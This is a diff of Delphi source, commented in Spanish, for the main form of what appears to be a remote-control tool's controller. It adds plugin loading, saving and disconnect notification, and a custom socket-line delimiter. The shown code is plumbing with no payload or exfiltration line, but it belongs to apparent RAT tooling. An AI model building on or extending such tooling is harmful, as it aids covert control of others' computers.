@@ -118,10 +118,7 @@ type
     Avisos1: TMenuItem;
     N4: TMenuItem;
     Abrirdirectoriousuario1: TMenuItem;
-    Plugins1: TMenuItem;
-    N5: TMenuItem;
-    PluginManager1: TMenuItem;
-    Plugin: TMenuItem;
+    Plugins: TMenuItem;
     procedure BtnEscucharClick(Sender: TObject);
     procedure ListViewConexionesContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
     procedure Abrir1Click(Sender: TObject);
@@ -408,6 +405,7 @@ end;
 procedure TFormMain.ServerSocketDisconnect(AThread: TIdPeerThread);
 var
   item: TListItem;
+  i : integer;
 begin
   if Athread.Data <> nil then
     begin
@@ -416,6 +414,9 @@ begin
 
       if item.SubItems.Objects[1] <> nil then
         begin
+          //Avisamos a los plugins que han sido cargados que el servidor se ha desconectado
+          for i:=0 to (item.SubItems.Objects[1] as TFormControl).NumeroPlugins-1 do
+            (item.SubItems.Objects[1] as TFormControl).Plugins[i].Desconectado();
           if FormOpciones.CheckBoxCerrarControlAlDesc.Checked then
             begin
               (item.SubItems.Objects[1] as TFormControl).Close;
@@ -458,7 +459,7 @@ var
 
 begin
   try
-    Buffer := Trim(Athread.Connection.ReadLn);
+    Buffer := Trim(Athread.Connection.ReadLn(#10#15#80#66#77#1#72#87));
   except
     Athread.Connection.Disconnect;
     Exit;
@@ -746,6 +747,7 @@ var
   i: Integer;
   c: TListColumn;
   TempStr: string;
+  itm : Tlistitem;
 begin
   try
     Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');
@@ -753,6 +755,7 @@ begin
     //Valores de la Form de Opciones
     with FormOpciones do
       begin
+        Plugins := Ini.ReadString('Opciones', 'Plugins', '');
         EditPuerto.Text :=
           Ini.ReadString('Opciones', 'PuertoEscucha', '3360;77');
         CheckBoxPreguntarAlSalir.Checked :=
@@ -791,6 +794,14 @@ begin
         LabeledDirThumbs.Text := Ini.ReadString('Opciones', 'PathMiniaturas', '%CoolDir%\Usuarios\%Identificator%\Miniaturas\');
         LabeledDirDownloads.Text := Ini.ReadString('Opciones', 'PathDescargas', '%CoolDir%\Usuarios\%Identificator%\Descargas\');
 
+      end;
+
+      Tempstr := FormOpciones.Plugins;   //añadimos los plugins al listview
+      FormOpciones.Plugins := '';
+      while (pos('|', TempStr) > 0) do
+      begin
+          FormOpciones.Pluginadd(Copy(TempStr, 1, Pos('|', TempStr) - 1));
+          Delete(TempStr, 1, Pos('|', TempStr));
       end;
     //Valores de la Form de Configuracion del server
     with FormConfigServer do
@@ -868,6 +879,9 @@ begin
     Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');
 
     //Valores de la Form de Opciones
+
+
+    Ini.WriteString('Opciones', 'Plugins', FormOpciones.Plugins);
     Ini.WriteString('Opciones', 'PuertoEscucha', FormOpciones.EditPuerto.Text);
     Ini.WriteBool('Opciones', 'PreguntarSalir',
       FormOpciones.CheckBoxPreguntarAlSalir.Checked);
@@ -1468,7 +1482,7 @@ begin
   while Assigned(mslistviewitem) do
     begin
       VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
-      
+
       VentanaControl.CargarPlugin((Sender as Tmenuitem).Hint);
 
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
